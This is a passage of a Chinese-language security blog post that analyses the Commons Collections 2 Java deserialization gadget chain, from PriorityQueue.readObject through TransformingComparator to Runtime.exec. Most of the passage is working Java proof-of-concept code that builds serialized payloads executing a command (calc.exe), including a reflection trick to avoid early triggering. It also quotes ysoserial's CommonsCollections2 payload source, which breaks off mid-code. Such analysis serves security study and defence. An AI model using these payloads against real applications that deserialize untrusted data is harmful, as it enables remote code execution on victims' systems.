class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PriorityQueueTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        PriorityQueue&lt;String&gt; q = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;String&gt;();</span><br><span class="line">        <span class="comment">//入列</span></span><br><span class="line">        q.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        <span class="comment">//出列</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//1</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//2</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//3</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//4</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221648706-1933465245.png" alt="image-20220428221648204"></p><p>观察打印结果， 入列：21534， 出列是12345， 也是说出列时做了相关判断，将最小的值返回。默认情况下<code>PriorityQueue</code>使用自然排序法，最小元素先出列。</p><h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p><code>TransformingComparator</code>是一个修饰器，和CC1中的<code>ChainedTransformer</code>类似。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221854229-2119926089.png" alt="image-20220428221853556">这个类有个compare()方法，会调用<code>Transformer#transform()</code>方法，根据前面的学习，猜测这里可能存在利用点，那具体该怎么利用呢，是否真的可以利用呢，下面开始分析。</p><h3 id="TransformingComparator-compare"><a href="#TransformingComparator-compare" class="headerlink" title="TransformingComparator.compare()"></a>TransformingComparator.compare()</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code> 类中提供了 <code>compare()</code> 方法，在该方法中对 <code>this.transformer</code> 调用了 <code>transform()</code> 方法，如果this.<code>transformer</code>可控，那么就可以利用该方法执行 <code>ChainedTransformer.transform()</code> 方法，并进入之前构造好的 <code>java.lang.Runtime.getRuntime().exec()</code> 调用链。</p><p>那现在查看下this.<code>transformer</code>是如何被赋值的。</p><p>在<code>TransformingComparator</code>的构造方法中，看到了赋值情况，并且两个构造方法都是被public关键字修饰的</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222500655-713162557.png" alt="image-20220428222500043"></p><p>也就是说，<code>this.transformer</code> 完全可控，我们可以将 <code>this.transformer</code> 指向 <code>ChainedTransformer</code> 对象来执行 <code>ChainedTransformer.transform()</code> 方法。</p><p>测试代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        transformingComparator.compare(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222751860-78428661.png" alt="image-20220428222750807"></p><p>成功弹出计算器，但是可以看到控制台报错了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222855641-1124003305.png" alt="image-20220428222855008"></p><p>根据报错信息，可以大致推断应该是类型转换有问题，而且运行的时候是先弹出计算器，后报错的，所以在下面的代码处打上断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223103501-833443309.png" alt="image-20220428223102363"></p><p>进入<code>compare()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223235512-1407610559.png" alt="image-20220428223235001"></p><p>这里的<code>transformer</code>被赋值为<code>ChainedTransformer</code>，然后调用<code>trasnform()</code>方法弹出计算器，所以我们重点就看函数的最后一行代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223451589-1296639309.png" alt="image-20220428223451003"></p><p>进入，在方法的注释中可以看到异常的信息说明，大致就是如果传入的参数不实现<code>Comparable</code>可就会产生这个报错。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223653410-1966169796.png" alt="image-20220428223652822"></p><p>在这也看到，使用了泛型来约束传入的类型</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223811906-1530593051.png" alt="image-20220428223811362"></p><p>报错原因找到了之后，但上述的代码只是手动调用compare()方法弹出计算器，那现在如何使 <code>TransformingComparator.compare()</code> 方法自动调用呢？我们在 Java 内置的 <code>PriorityQueue</code> 类中找到了一条可行的路子。</p><h3 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject()"></a>PriorityQueue.readObject()</h3><p><code>PriorityQueue</code> 类的 <code>readObject()</code> 方法中调用了一个 <code>heapify()</code> 方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224041906-2006646584.png" alt="image-20220428224041303"></p><h3 id="PriorityQueue-heapify"><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify()"></a>PriorityQueue.heapify()</h3><p>跟进 <code>heapify()</code> 方法，发现其调用了 <code>siftDown()</code> 方法，这里存在一个for循环，要想进入循环需要满足i &#x3D; (size &gt;&gt;&gt; 1) - 1 &gt;&#x3D; 0，即 <code>size &gt;= 2</code>，这里的size指的是队列中元素的个数。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224139339-1220977299.png" alt="image-20220428224138782"></p><h3 id="PriorityQueue-siftDown"><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown()"></a>PriorityQueue.siftDown()</h3><p>跟进 <code>siftDown()</code> 方法，发现如果 <code>comparator</code> 变量不为空，将调用 <code>siftDownUsingComparator()</code> 方法：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224410518-1285744807.png" alt="image-20220428224409958"></p><h3 id="PriorityQueue-siftDownUsingComparator"><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator()"></a>PriorityQueue.siftDownUsingComparator()</h3><p>跟进 <code>siftDownUsingComparator()</code> 方法，发现会调用 <code>comparator#compare()</code> 方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224546472-1478230969.png" alt="image-20220428224545847"></p><p>结合前面的<code>compare()</code>方法的利用，如果<code>comparator</code>可控的话，让它指向前文中构造的 <code>TransformingComparator</code> 对象，那么就可以执 <code>TransformingComparator.compare()</code> 方法了。那么，找一下<code>comparator</code>是怎么被赋值的。</p><p>查看 <code>PriorityQueue</code> 类的构造方法，其第 1 个参数用于指定队列的初始容量，第 2 个参数将赋值给 <code>this.comparator</code>，并且该构造方法对外开放，因此 <code>comparator</code> 变量完全可控</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428230103959-1884903828.png" alt="image-20220428230103189"></p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">package cc2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class TransformingComparatorTest2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;getMethod&quot;,</span><br><span class="line">//                    new Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;getRuntime&quot;, null&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;invoke&quot;,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        new Object[]&#123;null, null&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;exec&quot;,</span><br><span class="line">                        new Class[]&#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc.exe&quot;&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span><br><span class="line">//      transformingComparer.compare(&quot;test&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        byteArrayOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        byteArrayInputStream.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后，计算器弹出来了，但报错了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428232854470-716119011.png" alt="image-20220428232853231"></p><p>根据前面的报错分析，在调用<code>comparator.compare()</code>后，提示 “java.lang.ProcessImpl cannot be cast to java.lang.Comparable”，因为类型不符而报错，和上面那个报错是一样的，但是根据调试发现，程序在反序列化之前就弹出计算器了，那看看是怎么个调用的过程，</p><p>在如下地方打下断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233555440-365558024.png" alt="image-20220428233554728"></p><p>跟进add()方法，发现调用了offer()方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233638389-700739005.png" alt="image-20220428233637971"></p><p>跟进发现在<code>offer()</code>方法里会有一些if判断，这里如果i！&#x3D;0就会调用<code>siftUp()</code>方法，第一次调用add()方法时，这里的i&#x3D;0，即你不会调用siftUp()方法，当第二次调用add()方法时，就会进入，i&#x3D;1，就进入<code>siftUp()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233713262-1085845089.png" alt="image-20220428233712788"></p><p>跟进<code>siftUp()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234016305-1312990915.png" alt="image-20220428234015319"></p><p>这里判断comparator是否为空，如果为不空，就调用<code>siftUpUsingComparator()</code>方法，为空则调用<code>siftUpComparable()</code>方法，跟进<code>siftUpUsingComparator()</code>方法，这里会调用<code>comparator#compare()</code>方法，进而导致了计算器的弹出和报错的产生。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234124506-722393475.png" alt="image-20220428234123995"></p><p>我们返回，跟进<code>siftUpComparable()</code>方法，这里不会导致后续调用链的发生</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234310569-1479361245.png" alt="image-20220428234310116"></p><p>这里防止报错的关键是让<code>comparator</code>在<code>add()</code>方法调用的时候为空，实例化 <code>PriorityQueue</code> 对象后再通过反射将 <code>comparator</code> 设为 <code>TransformingComparator</code> 对象。</p><p>所以，优化代码后，可构造如下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTest3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="comment">// 传入 java.lang.Runtime 类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// 反射调用 getMethod() 方法, 并通过 getMethod() 调用 getRuntime() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 反射调用 invoke() 方法, 并通过 invoke() 调用上一循环中返回的 Runtime.getRuntime() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 反射调用 exec() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行反序列化的过程中会报同样的错误，但是在报错前就成功执行命令并弹出了计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428235511160-1422424351.png" alt="image-20220428235510084"></p><p>整个 Gadget Chain 的调用过程如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">     PriorityQueue.siftDown()</span><br><span class="line">   PriorityQueue.siftDownUsingComparator()</span><br><span class="line">    TransformingComparator.compare()</span><br><span class="line">     ChainedTransformer.transform()</span><br><span class="line">         ConstantTransformer.transform()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">       Class.getMethod()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">        Runtime.getRuntime()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">        Runtime.exec()</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429000139365-2096780426.png" alt="image-20220429000138216"></p><h3 id="Ysoserial-利用链分析"><a href="#Ysoserial-利用链分析" class="headerlink" title="Ysoserial 利用链分析"></a>Ysoserial 利用链分析</h3><p>对于 Commons Collections 2 这条链，ysoserial 利用的是 <code>TemplatesImpl</code> 类来进行利用的，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123; &quot;org.apache.commons:commons-collections4:4.0&quot; &#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Queue&lt;Object&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span 